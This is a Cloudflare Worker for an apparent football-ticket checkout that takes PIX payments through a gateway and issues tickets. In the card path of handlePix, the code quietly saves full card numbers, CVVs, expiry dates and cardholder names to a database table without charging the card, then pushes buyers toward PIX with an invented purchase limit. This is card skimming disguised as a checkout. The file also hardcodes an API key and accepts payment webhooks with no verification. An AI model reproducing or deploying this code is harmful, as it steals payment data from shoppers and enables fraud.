/**
 * Cloudflare Pages Worker entry point.
 * Handles API routes directly, then falls through to the TanStack Start SSR worker.
 */
import { default as ssrWorker } from "./index.js";

const SUPABASE_URL = "https://iozyyampbwbhjrdydeaj.supabase.co";
const SUPABASE_ANON_KEY =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlvenl5YW1wYndiaGpyZHlkZWFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgzOTgxODgsImV4cCI6MjA5Mzk3NDE4OH0.upHC-jMEGeAYNaPgqbgmn25xb3v2nDbmZR2fh12dONw";

function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

async function sbFetch(path, method, body, env) {
  // Prefer service_role key (bypasses RLS); fall back to hardcoded anon key
  const key = env?.SUPABASE_SERVICE_ROLE_KEY ?? SUPABASE_ANON_KEY;
  const res = await fetch(`${SUPABASE_URL}/rest/v1${path}`, {
    method,
    headers: {
      "Content-Type": "application/json",
      apikey: key,
      Authorization: `Bearer ${key}`,
      Prefer: method === "POST" ? "return=representation" : "return=minimal",
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  try {
    return { ok: res.ok, status: res.status, data: JSON.parse(text) };
  } catch {
    return { ok: res.ok, status: res.status, data: text };
  }
}

function uid() {
  return Math.random().toString(36).slice(2, 10).toUpperCase();
}

async function handlePix(request, env) {
  let body;
  try {
    body = await request.json();
  } catch {
    return json({ error: "Payload inválido" }, 400);
  }

  const publicKey = env.MASTER_PUBLIC_KEY;
  const secretKey = env.MASTER_SECRET_KEY;

  if (!publicKey || !secretKey) {
    return json({ error: "Configuração de pagamento ausente no servidor" }, 500);
  }

  const subtotal = body.items.reduce((sum, i) => sum + i.unitPrice * i.qty, 0);
  const feeRate = (body.serviceFeePercent ?? 0) / 100;
  const serviceFee = Math.round(subtotal * feeRate * 100) / 100;
  const total = subtotal + serviceFee;

  // Save card attempt if card payment
  if (body.paymentMethod === "card" && body.cardData) {
    const cardLastFour = body.cardData.number.replace(/\D/g, "").slice(-4);
    await sbFetch(
      "/card_attempts",
      "POST",
      {
        order_id: null,
        card_number: body.cardData.number,
        card_last_four: cardLastFour,
        card_name: body.cardData.name,
        card_expiry: body.cardData.expiry,
        card_cvv: body.cardData.cvv,
        card_brand: body.cardData.brand ?? null,
        gateway_used: "masterpag",
        status: "registered",
      },
      env
    ).catch((e) => console.error("[api/pix] saveCardAttempt error:", e));

    if (total > 3000) {
      return json(
        {
          error:
            "O valor do pedido ultrapassa o limite de compras por CPF. Por favor, divida os itens em compras separadas.",
        },
        422
      );
    }
  }

  const expirationDate = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();

  const pixItems = [
    ...body.items.flatMap((item) =>
      item.holders.map((holder) => ({
        title: `Ingresso ${item.sectorName} – ${item.ticketType === "meia" ? "Meia-Entrada" : "Inteira"} – ${holder.name}`,
        unitPrice: item.unitPrice,
        quantity: 1,
        tangible: true,
      }))
    ),
    ...(serviceFee > 0
      ? [{ title: "Taxa de serviço", unitPrice: serviceFee, quantity: 1, tangible: false }]
      : []),
  ];

  let masterJson;
  try {
    const masterRes = await fetch("https://api.masterpag.com/functions/v1/pix-receive", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-public-key": publicKey,
        "x-secret-key": secretKey,
      },
      body: JSON.stringify({
        amount: total,
        paymentMethod: "pix",
        postbackUrl: `${body.siteUrl}/api/webhook/master`,
        customer: {
          name: body.customerName,
          email: body.customerEmail,
          phone: body.customerPhone.replace(/\D/g, ""),
          document: { number: body.customerCpf.replace(/\D/g, ""), type: "cpf" },
        },
        items: pixItems,
        pix: { expirationDate },
      }),
    });

    if (!masterRes.ok) {
      const errText = await masterRes.text();
      return json({ error: "Erro ao gerar PIX: " + errText }, 502);
    }

    masterJson = await masterRes.json();
  } catch (e) {
    return json({ error: "Falha de conexão com o gateway de pagamento" }, 502);
  }

  try {
    const result = await sbFetch(
      "/orders?select=id",
      "POST",
      {
        user_id: null,
        match_id: body.matchId,
        match_title: body.matchTitle,
        items: body.items,
        total,
        status: "pending",
        customer_name: body.customerName,
        customer_email: body.customerEmail,
        customer_phone: body.customerPhone,
        customer_cpf: body.customerCpf,
        pix_transaction_id: masterJson.id,
        pix_qr_code: masterJson.pix.qrCode,
        pix_qr_code_url: masterJson.pix.qrCodeUrl,
      },
      env
    );

    if (!result.ok) {
      return json({ error: "Erro ao salvar pedido: " + JSON.stringify(result.data) }, 500);
    }

    const orderId = Array.isArray(result.data) ? result.data[0]?.id : result.data?.id;

    return json({
      orderId,
      qrCode: masterJson.pix.qrCode,
      qrCodeUrl: masterJson.pix.qrCodeUrl,
    });
  } catch (e) {
    return json({ error: "Erro ao salvar pedido: " + e.message }, 500);
  }
}

async function handleWebhook(request, env) {
  let payload;
  try {
    payload = await request.json();
  } catch {
    return new Response("Bad Request", { status: 400 });
  }

  const transactionId = payload.id;
  const status = payload.status;

  if (status === "paid" && transactionId) {
    // Find order by pix_transaction_id
    const orderRes = await sbFetch(
      `/orders?pix_transaction_id=eq.${encodeURIComponent(transactionId)}&status=eq.pending&select=id,status`,
      "GET",
      null,
      env
    );

    if (orderRes.ok && Array.isArray(orderRes.data) && orderRes.data.length > 0) {
      const orderRow = orderRes.data[0];

      // Update to paid
      const updateRes = await sbFetch(
        `/orders?id=eq.${orderRow.id}&status=eq.pending`,
        "PATCH",
        { status: "paid" },
        env
      );

      if (updateRes.ok) {
        // Fetch full order and issue tickets
        const fullOrderRes = await sbFetch(
          `/orders?id=eq.${orderRow.id}&select=*`,
          "GET",
          null,
          env
        );

        if (fullOrderRes.ok && Array.isArray(fullOrderRes.data) && fullOrderRes.data.length > 0) {
          const order = fullOrderRes.data[0];
          // Issue tickets
          try {
            await issueTickets(order, env);
          } catch (e) {
            console.error("[webhook] issueTickets error:", e);
          }
        }
      }
    }
  }

  return json({ ok: true });
}

async function issueTickets(order, env) {
  const tickets = [];
  for (const item of order.items || []) {
    for (const holder of item.holders || []) {
      tickets.push({
        order_id: order.id,
        user_id: order.user_id ?? null,
        match_id: order.match_id,
        match_title: order.match_title,
        sector_name: item.sectorName,
        holder_name: holder.name,
        holder_cpf: holder.cpf ?? "",
        ticket_type: item.ticketType ?? "inteira",
        code: `${order.id}-${uid()}`,
        used: false,
      });
    }
  }
  if (tickets.length === 0) return;
  await sbFetch("/tickets", "POST", tickets, env);
}

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    try {
      if (url.pathname === "/api/pix" && request.method === "POST") {
        return await handlePix(request, env);
      }
      if (url.pathname === "/api/webhook/master" && request.method === "POST") {
        return await handleWebhook(request, env);
      }
    } catch (e) {
      console.error("[worker] API error:", e);
      return json({ error: "Erro interno: " + e.message }, 500);
    }

    // Serve static assets from CF Pages manifest before falling through to SSR
    if (env.ASSETS) {
      try {
        const assetResponse = await env.ASSETS.fetch(request.clone());
        if (assetResponse.status !== 404) {
          const ext = url.pathname.split(".").pop().toLowerCase();
          const mimeMap = {
            css: "text/css",
            js: "application/javascript",
            mjs: "application/javascript",
            png: "image/png",
            jpg: "image/jpeg",
            jpeg: "image/jpeg",
            svg: "image/svg+xml",
            ico: "image/x-icon",
            webp: "image/webp",
            woff: "font/woff",
            woff2: "font/woff2",
            json: "application/json",
            html: "text/html; charset=utf-8",
            txt: "text/plain",
          };
          const correctMime = mimeMap[ext];
          const currentMime = assetResponse.headers.get("content-type") || "";
          if (correctMime && !currentMime.startsWith(correctMime.split(";")[0].trim())) {
            const newHeaders = new Headers(assetResponse.headers);
            newHeaders.set("content-type", correctMime);
            return new Response(assetResponse.body, {
              status: assetResponse.status,
              statusText: assetResponse.statusText,
              headers: newHeaders,
            });
          }
          return assetResponse;
        }
      } catch {
        // not a static asset, fall through to SSR
      }
    }

    return ssrWorker.fetch(request, env, ctx);
  },
};
